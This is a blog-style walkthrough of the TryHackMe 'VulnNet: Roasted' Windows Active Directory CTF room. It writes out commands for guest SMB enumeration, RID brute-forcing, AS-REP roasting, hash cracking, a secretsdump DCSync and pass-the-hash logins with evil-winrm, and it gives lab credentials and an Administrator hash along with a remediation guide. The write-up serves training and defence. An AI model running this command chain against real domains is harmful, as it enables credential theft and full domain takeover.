---
layout: post
title: 'VulnNet: Roasted - TryHackMe Challenge Walkthrough'
date: 2026-01-27 19:03:19 +0000
categories: [cybersecurity]
tags:
  - tryhackme
  - writeup
  - ctf
description: "VulnNet Entertainment quickly deployed another management instance on their very broad network…"
canonical_url: "https://medium.com/@hemanthakrishnach/vulnnet-roasted-tryhackme-challenge-walkthrough-59aa87cbd8a9"
image: "/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-000-33126f0e.png"
---

VulnNet Entertainment quickly deployed another management instance on their very broad network…

---

### VulnNet: Roasted — TryHackMe Challenge Walkthrough

VulnNet Entertainment quickly deployed another management instance on their very broad network…

In this walkthrough, we are tackling “VulnNet: Roasted,” a Windows-based Capture The Flag challenge. We will navigate through open SMB shares, identify employees to build a target list, exploit Kerberos via AS-REP Roasting, and finally leverage DCSync for total domain compromise.![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-000-33126f0e.png)

Room Link: <https://tryhackme.com/room/vulnnetroasted>

![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-001-5240380e.png)

### 1. Reconnaissance and Enumeration

We start with a standard Nmap scan to identify the landscape.
```bash
nmap -T4 -p- -A <MACHINE_IP>
```
![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-002-0ed92f3c.png)

The scan reveals a Windows Server environment (likely Server 2019) with a standard Active Directory port configuration:

- **53:** DNS- **88:** Kerberos- **135/139/445:** RPC and SMB- **5985:** WinRM (Microsoft HTTPAPI)

With Port 445 open, our first stop is SMB enumeration. We use `NetExec` (formerly CrackMapExec) to check for null or guest access.
```bash
nxc smb <MACHINE_IP> -u ‘guest’ -p '' --shares
```
![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-003-87895b5e.png)

The output confirms guest access is enabled and reveals the domain `vulnnet-rst.local`. More importantly, we see a non-default shares named `VulnNet-Business-Anonymous and VulnNet-Enterprise-Anonymous`with READ permissions.

### 2. Information Gathering

We connect to the exposed share using `smbclient` to hunt for data.
```cpp
smbclient //<MACHINE_IP>/VulnNet-Business-Anonymous
```
![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-004-c0db5a0d.png)

Inside, we find three text files: `Business-Manager.txt`, `Business-Sections.txt`, and `Business-Tracking.txt`. Upon downloading and reading these files, we find names of company employees and their roles—gold dust for username enumeration.![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-005-c27f46be.png)![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-006-eeb22345.png)![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-007-3bf4c93f.png)

We see something similar in the VulnNet-Enterprise-Anonymous share.

**Potential Usernames Identified:**

- **Alexa Whitehat** (Core Business Manager)- **Jack Goldenhand** (Business Unrelated Proposals)- **Tony Skid** (Core Security Manager)- **Johnny Leet** (Infrastructure/Sync)

Now let’s query the Domain Controller directly to enumerate built-in accounts and groups. Since we know Guest access is enabled, we can perform a **RID (Relative ID) Brute-Force** attack.
```bash
nxc smb <MACHINE_IP> -u 'a' -p '' --rid-brute
```
![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-008-1c33db40.png)

We create a `users.txt` wordlist![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-009-6347b8cf.png)

### 3. Gaining a Foothold: AS-REP Roasting

With a valid user list and Kerberos open (Port 88), we attempt **AS-REP Roasting**. This attack checks if any users have “Do not require Kerberos preauthentication” enabled, allowing us to request a ticket and crack the session key offline.

We use Impacket’s `GetNPUsers.py`:
```bash
sudo GetNPUsers.py -dc-ip <MACHINE_IP> -usersfile users.txt -no-pass vulnnet-rst.local/
```
![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-010-e01b9adc.png)

Success! The user `t-skid` is vulnerable. The tool outputs a hash starting with `$krb5asrep$23...`

#### Cracking the Hash

We save the hash to a file and fire up `hashcat` with mode 18200:
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-011-4d067301.png)

Hashcat cracks it quickly.

**Credentials Found:** `t-skid` : `tj072889*`

### 4. Lateral Movement

We verify the new credentials and check for access to other shares.
```bash
nxc smb <MACHINE_IP> -u 't-skid' -p 'tj072889*' --shares
```
![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-012-5853b18f.png)

The user `t-skid` has READ access to the `NETLOGON` share. We connect and find a suspicious script: `ResetPassword.vbs`![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-013-ce48c63d.png)

Analyzing the VBS script reveals hardcoded credentials inside the code:
> `strUserNTName "a-whitehat"``strPassword = "bNdKVkjv3RR9ht"`

![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-014-0c10e8b6.png)

### 5. Capturing the User Flag

We test `a-whitehat`'s credentials against the domain. NetExec returns `(Pwn3d!)`, confirming valid access.![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-015-3a4a60fd.png)

Since the WinRM port (5985) was open during our initial scan, we use `evil-winrm` to log in.
```bash
evil-winrm -i <MACHINE_IP> -u a-whitehat -p 'bNdKVkjv3RR9ht'
```
![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-016-6883104a.png)

Once inside, we navigate to the desktop of the `enterprise-core-vn` user and capture the first flag.

**Flag Location:** `C:\Users\enterprise-core-vn\Desktop\user.txt`

### 6. Privilege Escalation to Domain Admin

Now logged in as `a-whitehat`, we check for privileges. It appears this user has high-level permissions, potentially allowing us to perform a **DCSync attack** (replicating directory changes to dump hashes).

We run `secretsdump.py` remotely using the credentials we found:
```bash
secretsdump.py vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@<MACHINE_IP>
```
![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-017-e4d7f114.png)

The attack works perfectly. We successfully dump the NTLM hashes for the entire domain, including the **Administrator**.

**Administrator NTLM Hash:** `c2597747aa5e43022a3a3049a3c3b09d`

### 7. The Final Flag

We don’t need to crack the Administrator hash; we can simply “Pass the Hash” using `evil-winrm`.
```bash
evil-winrm -i <MACHINE_IP> -u Administrator -H 'c2597747aa5e43022a3a3049a3c3b09d'
```

We land in a shell as `Administrator`. We navigate to the Desktop to claim the final prize.![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-018-83d34b36.png)

**Flag Location:** `C:\Users\Administrator\Desktop\system.txt`.

### Summary of Techniques Used

- **SMB Enumeration:** Identifying accessible shares and gathering intelligence.- **Username Scraping:** parsing internal documents to build a target list.- **AS-REP Roasting:** Exploiting Kerberos pre-authentication settings.- **Cleartext Credentials:** Finding passwords in scripts on the `NETLOGON` share.- **DCSync:** Leveraging privileges to dump domain hashes.- **Pass-the-Hash:** Authenticating with NTLM hashes instead of plaintext passwords.

### Remediation Guide

- **Kill Enumeration:** Disable the Guest account immediately. Enable the GPO **“Network access: Do not allow anonymous enumeration of SAM accounts”** to block the RID Brute-force attack we used to map the domain.- **Prevent Roasting:** Audit Active Directory and ensure **“Do not require Kerberos preauthentication”** is **unchecked** for every user, specifically targeting accounts like `t-skid`.- **Scrub Scripts:** Automate scans of file shares (NETLOGON/SYSVOL) to detect cleartext passwords in scripts like `ResetPassword.vbs`. Replace hardcoded credentials with Group Managed Service Accounts (gMSA).- **Stop DCSync:** Audit Domain permissions strictly. Only Domain Controllers should hold **“Replicating Directory Changes”** rights; never regular users like `a-whitehat`

### Thank you for reading! I hope it was helpful.
